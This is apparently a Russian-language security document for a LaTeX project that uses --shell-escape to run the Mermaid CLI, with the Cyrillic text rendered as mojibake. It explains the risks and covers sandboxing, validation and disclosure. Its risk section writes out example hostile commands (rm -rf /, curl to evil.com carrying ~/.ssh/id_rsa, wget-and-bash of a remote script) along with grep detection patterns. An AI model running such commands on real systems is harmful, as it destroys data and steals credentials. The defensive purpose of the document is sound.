# –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –ø—Ä–æ–µ–∫—Ç–∞

## üîí –û–±–∑–æ—Ä

–≠—Ç–æ—Ç –ø—Ä–æ–µ–∫—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç LaTeX —Å —Ñ–ª–∞–≥–æ–º `--shell-escape` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ Mermaid –¥–∏–∞–≥—Ä–∞–º–º —á–µ—Ä–µ–∑ –≤–Ω–µ—à–Ω—é—é —É—Ç–∏–ª–∏—Ç—É `mmdc`. –î–∞–Ω–Ω—ã–π –¥–æ–∫—É–º–µ–Ω—Ç –æ–ø–∏—Å—ã–≤–∞–µ—Ç —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å —ç—Ç–∏–º —Ä–∏—Å–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –º–µ—Ä—ã –ø—Ä–µ–¥–æ—Å—Ç–æ—Ä–æ–∂–Ω–æ—Å—Ç–∏.

---

## ‚ö†Ô∏è –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ —Ä–∏—Å–∫–∏

### 1. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ `--shell-escape`

**–ß—Ç–æ —ç—Ç–æ:**
–§–ª–∞–≥ `--shell-escape` –ø–æ–∑–≤–æ–ª—è–µ—Ç LaTeX –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã —á–µ—Ä–µ–∑ `\write18` –∏–ª–∏ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ –ø–∞–∫–µ—Ç—ã.

**–ó–∞—á–µ–º –Ω—É–∂–Ω–æ:**
- –ù–∞—à –ø–∞–∫–µ—Ç `mermaid.sty` –∏—Å–ø–æ–ª—å–∑—É–µ—Ç `\immediate\write18` –¥–ª—è –∑–∞–ø—É—Å–∫–∞ `mmdc` (Mermaid CLI)
- –ë–µ–∑ —ç—Ç–æ–≥–æ —Ñ–ª–∞–≥–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏—è –¥–∏–∞–≥—Ä–∞–º–º –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞

**–†–∏—Å–∫–∏:**
- ‚ö†Ô∏è **–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞**: –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π `.tex` —Ñ–∞–π–ª –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ª—é–±—ã–µ –∫–æ–º–∞–Ω–¥—ã –Ω–∞ –≤–∞—à–µ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ
- ‚ö†Ô∏è **–£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤**: `\write18{rm -rf /}`
- ‚ö†Ô∏è **–ö—Ä–∞–∂–∞ –¥–∞–Ω–Ω—ã—Ö**: `\write18{curl http://evil.com?data=$(cat ~/.ssh/id_rsa)}`
- ‚ö†Ô∏è **–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û**: `\write18{wget http://evil.com/malware.sh && bash malware.sh}`

**–ü—Ä–∏–º–µ—Ä –æ–ø–∞—Å–Ω–æ–≥–æ –∫–æ–¥–∞:**
```latex
\documentclass{article}
\begin{document}
% –û–ü–ê–°–ù–û! –£–¥–∞–ª–∏—Ç –≤—Å–µ —Ñ–∞–π–ª—ã –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
\immediate\write18{rm -rf *}
\end{document}
```

### 2. Puppeteer —Å `--no-sandbox`

**–ß—Ç–æ —ç—Ç–æ:**
–§–∞–π–ª `puppeteer-config.json` —Å–æ–¥–µ—Ä–∂–∏—Ç —Ñ–ª–∞–≥–∏ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ Chromium –±–µ–∑ sandbox –∏–∑–æ–ª—è—Ü–∏–∏.

**–ó–∞—á–µ–º –Ω—É–∂–Ω–æ:**
- –í CI –æ–∫—Ä—É–∂–µ–Ω–∏—è—Ö (GitHub Actions, Docker) Chromium –Ω–µ –º–æ–∂–µ—Ç –∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è —Å sandbox
- –¢—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è —Ä–∞–±–æ—Ç—ã `mmdc` –≤ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ä–µ–¥–∞—Ö

**–†–∏—Å–∫–∏:**
- ‚ö†Ô∏è Chromium —Ä–∞–±–æ—Ç–∞–µ—Ç –±–µ–∑ –∏–∑–æ–ª—è—Ü–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞
- ‚ö†Ô∏è –ü—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ mmdc/Chromium –≤–æ–∑–º–æ–∂–µ–Ω –≤—ã—Ö–æ–¥ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞
- ‚ö†Ô∏è **–¢–æ–ª—å–∫–æ –¥–ª—è CI/CD**: –ù–ï –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —ç—Ç–∏ —Ñ–ª–∞–≥–∏ –ª–æ–∫–∞–ª—å–Ω–æ!

---

## ‚úÖ –ú–µ—Ä—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

### –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞: `-shell-restricted`

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è:** –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ `-shell-restricted` –≤–º–µ—Å—Ç–æ `--shell-escape` –≥–¥–µ –≤–æ–∑–º–æ–∂–Ω–æ.

**–ß—Ç–æ —Ä–∞–∑—Ä–µ—à–∞–µ—Ç `-shell-restricted`:**
```bash
# –≠—Ç–∏ –∫–æ–º–∞–Ω–¥—ã –±–µ–∑–æ–ø–∞—Å–Ω—ã:
xelatex -shell-restricted document.tex
```

–†–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
- `bibtex`, `biber` (–±–∏–±–ª–∏–æ–≥—Ä–∞—Ñ–∏—è)
- `kpsewhich` (–ø–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤)
- `makeindex` (–∏–Ω–¥–µ–∫—Å—ã)
- `repstopdf` (–∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π)

**–ü—Ä–æ–±–ª–µ–º–∞ –¥–ª—è –Ω–∞—à–µ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞:**
‚ùå `mmdc` –ù–ï –≤—Ö–æ–¥–∏—Ç –≤ —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ `-shell-restricted`

**–†–µ—à–µ–Ω–∏–µ:** –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ `--shell-escape` –¢–û–õ–¨–ö–û –¥–ª—è –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤.

### –ë–µ–∑–æ–ø–∞—Å–Ω–∞—è —Ä–∞–±–æ—Ç–∞ —Å –ø—Ä–æ–µ–∫—Ç–æ–º

#### 1. –†–∞–±–æ—Ç–∞–π—Ç–µ —Ç–æ–ª—å–∫–æ —Å –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏

‚úÖ **–ë–ï–ó–û–ü–ê–°–ù–û:**
```bash
# –í–∞—à–∏ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã
xelatex --shell-escape main.tex

# –§–∞–π–ª—ã –∏–∑ –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤
xelatex --shell-escape trusted-document.tex
```

‚ùå **–û–ü–ê–°–ù–û:**
```bash
# –§–∞–π–ª—ã –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
curl https://unknown-site.com/document.tex | xelatex --shell-escape

# –§–∞–π–ª—ã –æ—Ç –Ω–µ–∑–Ω–∞–∫–æ–º—Ü–µ–≤
xelatex --shell-escape random-file-from-email.tex
```

#### 2. –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ `.tex` —Ñ–∞–π–ª—ã –ø–µ—Ä–µ–¥ –∫–æ–º–ø–∏–ª—è—Ü–∏–µ–π

**–ò—â–∏—Ç–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:**
```bash
# –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ–ø–∞—Å–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã
grep -r "\\write18" *.tex
grep -r "\\immediate" *.tex
grep -r "rm -rf" *.tex
grep -r "curl" *.tex
grep -r "wget" *.tex
```

**–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞:**
```bash
# –°–∫—Ä–∏–ø—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ (—Å–º. scripts/validate-tex.sh)
./scripts/validate-tex.sh main.tex
```

#### 3. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–µ—Å–æ—á–Ω–∏—Ü—É –¥–ª—è –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã—Ö –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤

**Docker –∏–∑–æ–ª—è—Ü–∏—è:**
```bash
# –ó–∞–ø—É—Å–∫ –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ
docker run --rm -v $(pwd):/work texlive/texlive \
  xelatex --shell-escape /work/document.tex
```

**–í–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –º–∞—à–∏–Ω–∞:**
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ VM –¥–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –Ω–µ–¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
- –°–æ–∑–¥–∞–π—Ç–µ snapshot –ø–µ—Ä–µ–¥ –∫–æ–º–ø–∏–ª—è—Ü–∏–µ–π

#### 4. –û–≥—Ä–∞–Ω–∏—á—å—Ç–µ –ø—Ä–∞–≤–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

```bash
# –°–æ–∑–¥–∞–π—Ç–µ –æ—Ç–¥–µ–ª—å–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è LaTeX
sudo useradd -m -s /bin/bash latexuser

# –ö–æ–º–ø–∏–ª–∏—Ä—É–π—Ç–µ –æ—Ç –µ–≥–æ –∏–º–µ–Ω–∏
sudo -u latexuser xelatex --shell-escape document.tex
```

### –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –≤ CI/CD

**GitHub Actions** (—É–∂–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ):
```yaml
# .github/workflows/build-project.yml
- name: Build with limited permissions
  run: |
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º --shell-escape —Ç–æ–ª—å–∫–æ –¥–ª—è –∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ main.tex
    chmod +x build.sh
    ./build.sh
  # –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä —É–Ω–∏—á—Ç–æ–∂–∞–µ—Ç—Å—è –ø–æ—Å–ª–µ –∫–∞–∂–¥–æ–≥–æ –∑–∞–ø—É—Å–∫–∞
```

‚úÖ **–ü–æ—á–µ–º—É –±–µ–∑–æ–ø–∞—Å–Ω–æ –≤ CI:**
- –≠—Ñ–µ–º–µ—Ä–Ω—ã–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã (—É–Ω–∏—á—Ç–æ–∂–∞—é—Ç—Å—è –ø–æ—Å–ª–µ –∫–∞–∂–¥–æ–≥–æ –∑–∞–ø—É—Å–∫–∞)
- –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–µ–∫—Ä–µ—Ç–∞–º –∫—Ä–æ–º–µ —è–≤–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã—Ö
- –ò–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Ñ–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞
- –õ–æ–≥–∏ –¥–æ—Å—Ç—É–ø–Ω—ã –¥–ª—è –∞—É–¥–∏—Ç–∞

---

## üõ°Ô∏è –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é

### –î–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ —ç—Ç–æ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞

1. ‚úÖ **–î–æ–≤–µ—Ä—è–π—Ç–µ —Å–≤–æ–µ–º—É –∫–æ–¥—É**: –í—Å–µ `.tex` —Ñ–∞–π–ª—ã –≤ —ç—Ç–æ–º —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏ –ø—Ä–æ–≤–µ—Ä–µ–Ω—ã
2. ‚úÖ **–†–µ–≤—å—é –∏–∑–º–µ–Ω–µ–Ω–∏–π**: –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ Pull Request –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö `\write18`
3. ‚úÖ **CI/CD —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ**: GitHub Actions –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ç–µ—Å—Ç–∏—Ä—É–µ—Ç –∫–∞–∂–¥—ã–π –∫–æ–º–º–∏—Ç
4. ‚úÖ **–í–µ—Ä—Å–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ**: Git –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ—Ç–∫–∞—Ç–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è

### –î–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø–∞–∫–µ—Ç–∞ mermaid.sty

**–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è:**
```latex
% –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –≤ –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –ø—Ä–æ–µ–∫—Ç–∞—Ö
\usepackage{mermaid}

\begin{mermaidenv}[width=10cm]
graph TD
  A[–ü—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–π] --> B[–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π]
\end{mermaidenv}
```

**–ù–ï –¥–µ–ª–∞–π—Ç–µ:**
```latex
% –û–ü–ê–°–ù–û! –ù–µ –∫–æ–º–ø–∏–ª–∏—Ä—É–π—Ç–µ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–µ –ø—Ä–∏–º–µ—Ä—ã
% –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ —Å --shell-escape!
```

### –î–ª—è –ø—Ä–µ–ø–æ–¥–∞–≤–∞—Ç–µ–ª–µ–π –∏ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–π

**–ï—Å–ª–∏ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç–µ `.tex` —Ñ–∞–π–ª—ã –æ—Ç —Å—Ç—É–¥–µ–Ω—Ç–æ–≤:**

1. **–ë–µ–∑ `--shell-escape`:**
   ```bash
   # –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–∞—á–∞–ª–∞ –±–µ–∑ shell-escape
   xelatex document.tex
   ```

2. **–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞:**
   ```bash
   # –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –Ω–∞—à –≤–∞–ª–∏–¥–∞—Ç–æ—Ä
   ./scripts/validate-tex.sh student-submission.tex
   ```

3. **–ü–µ—Å–æ—á–Ω–∏—Ü–∞:**
   ```bash
   # Docker –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è–º–∏
   docker run --rm --network none \
     -v $(pwd):/work:ro \
     -v $(pwd)/output:/output \
     texlive/texlive \
     xelatex --shell-escape -output-directory=/output /work/document.tex
   ```

---

## üîç –ê—É–¥–∏—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

### –ß—Ç–æ –º—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –≤ —ç—Ç–æ–º –ø—Ä–æ–µ–∫—Ç–µ

**–ö–æ–º–∞–Ω–¥—ã —á–µ—Ä–µ–∑ `\write18`:**
```latex
% mermaid-package/mermaid.sty
\immediate\write18{mmdc -p puppeteer-config.json
  -i \mermaid@absmmdfile\space
  -o \mermaid@abspngfile\space
  \mermaid@verboseflag}
```

**–ü–æ—á–µ–º—É –±–µ–∑–æ–ø–∞—Å–Ω–æ:**
- ‚úÖ –ü—É—Ç—å –∫ —Ñ–∞–π–ª–∞–º –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç—Å—è –ø–∞–∫–µ—Ç–æ–º (–Ω–µ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç—Å—è –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞–ø—Ä—è–º—É—é)
- ‚úÖ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –∏–∑–≤–µ—Å—Ç–Ω–∞—è —É—Ç–∏–ª–∏—Ç–∞ `mmdc`
- ‚úÖ –ù–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –∏–Ω—ä–µ–∫—Ü–∏–∏ –∫–æ–º–∞–Ω–¥ —á–µ—Ä–µ–∑ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ `.mmd` —Ñ–∞–π–ª–∞
- ‚úÖ –í—Å–µ –ø—É—Ç–∏ —ç–∫—Ä–∞–Ω–∏—Ä—É—é—Ç—Å—è —á–µ—Ä–µ–∑ `\detokenize`

**–ü—Ä–æ–≤–µ—Ä–∫–∞:**
```bash
# –£–±–µ–¥–∏—Ç–µ—Å—å —á—Ç–æ mmdc - —ç—Ç–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ Mermaid CLI
which mmdc
# /usr/local/bin/mmdc

mmdc --version
# @mermaid-js/mermaid-cli/10.x.x
```

### –†–µ–≥—É–ª—è—Ä–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏

**–ï–∂–µ–Ω–µ–¥–µ–ª—å–Ω–æ:**
```bash
# –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
npm update -g @mermaid-js/mermaid-cli

# –ü—Ä–æ–≤–µ—Ä–∫–∞ CVE
npm audit
```

**–ü—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è—Ö:**
```bash
# –ü–æ–∏—Å–∫ –Ω–æ–≤—ã—Ö \write18
git diff HEAD | grep "write18"

# –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Å–µ—Ö .tex —Ñ–∞–π–ª–æ–≤
find . -name "*.tex" -exec ./scripts/validate-tex.sh {} \;
```

---

## üìö –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ä–µ—Å—É—Ä—Å—ã

### –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è LaTeX Security
- [TeX FAQ: Shell Escape](https://texfaq.org/FAQ-spawnprog)
- [LaTeX Project: Security](https://www.latex-project.org/publications/)
- [Overleaf: Shell Escape](https://www.overleaf.com/learn/latex/Articles/Shell_Escape)

### CVE –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
- [CVE Details: TeX](https://www.cvedetails.com/product/395/Tex-Tex.html)
- [Snyk: npm @mermaid-js/mermaid-cli](https://snyk.io/advisor/npm-package/@mermaid-js/mermaid-cli)

### –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã –±–µ–∑ shell-escape
- **mermaid-filter** (Pandoc): –ù–µ —Ç—Ä–µ–±—É–µ—Ç shell-escape, –Ω–æ –Ω—É–∂–µ–Ω Pandoc
- **svg-inkscape**: LaTeX –ø–∞–∫–µ—Ç –¥–ª—è SVG –±–µ–∑ –≤–Ω–µ—à–Ω–∏—Ö –∫–æ–º–∞–Ω–¥
- **tikz**: –ù–∞—Ç–∏–≤–Ω—ã–µ –¥–∏–∞–≥—Ä–∞–º–º—ã LaTeX (—Å–ª–æ–∂–Ω–µ–µ –≤ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏)

---

## üö® –°–æ–æ–±—â–µ–Ω–∏–µ –æ –ø—Ä–æ–±–ª–µ–º–∞—Ö –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

–ï—Å–ª–∏ –≤—ã –Ω–∞—à–ª–∏ —É—è–∑–≤–∏–º–æ—Å—Ç—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤ —ç—Ç–æ–º –ø—Ä–æ–µ–∫—Ç–µ:

**–ù–ï —Å–æ–∑–¥–∞–≤–∞–π—Ç–µ –ø—É–±–ª–∏—á–Ω—ã–π Issue!**

–í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ:
1. –û—Ç–ø—Ä–∞–≤—å—Ç–µ email –∞–≤—Ç–æ—Ä—É –ø—Ä–æ–µ–∫—Ç–∞ (—Å–º. config.tex)
2. –û–ø–∏—à–∏—Ç–µ —É—è–∑–≤–∏–º–æ—Å—Ç—å –∏ —Å–ø–æ—Å–æ–± –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è
3. –î–∞–π—Ç–µ –≤—Ä–µ–º—è –Ω–∞ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ (14 –¥–Ω–µ–π)
4. –ü–æ–ª—É—á–∏—Ç–µ –±–ª–∞–≥–æ–¥–∞—Ä–Ω–æ—Å—Ç—å –≤ SECURITY.md

**–û—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Ä–∞—Å–∫—Ä—ã—Ç–∏–µ (Responsible Disclosure)**

---

## ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

–ü–µ—Ä–µ–¥ –∫–æ–º–ø–∏–ª—è—Ü–∏–µ–π –¥–æ–∫—É–º–µ–Ω—Ç–∞ —Å `--shell-escape`:

- [ ] –Ø –¥–æ–≤–µ—Ä—è—é –∏—Å—Ç–æ—á–Ω–∏–∫—É —ç—Ç–æ–≥–æ `.tex` —Ñ–∞–π–ª–∞
- [ ] –Ø –ø—Ä–æ–≤–µ—Ä–∏–ª —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ `\write18`
- [ ] –§–∞–π–ª –Ω–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ (`rm`, `curl`, `wget`)
- [ ] –Ø —Ä–∞–±–æ—Ç–∞—é –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥–µ (VM/Docker) –∏–ª–∏ –Ω–∞ —Å–≤–æ—ë–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ
- [ ] –£ –º–µ–Ω—è –µ—Å—Ç—å —Ä–µ–∑–µ—Ä–≤–Ω–∞—è –∫–æ–ø–∏—è –≤–∞–∂–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
- [ ] –Ø –ø–æ–Ω–∏–º–∞—é —Ä–∏—Å–∫–∏ –∏ –≥–æ—Ç–æ–≤ –∫ –Ω–∏–º

**–ï—Å–ª–∏ —Ö–æ—Ç—å –æ–¥–∏–Ω –ø—É–Ω–∫—Ç –ù–ï –≤—ã–ø–æ–ª–Ω–µ–Ω - –ù–ï –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ `--shell-escape`!**

---

**–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ:** 2025-01-06
**–í–µ—Ä—Å–∏—è –¥–æ–∫—É–º–µ–Ω—Ç–∞:** 1.0.0
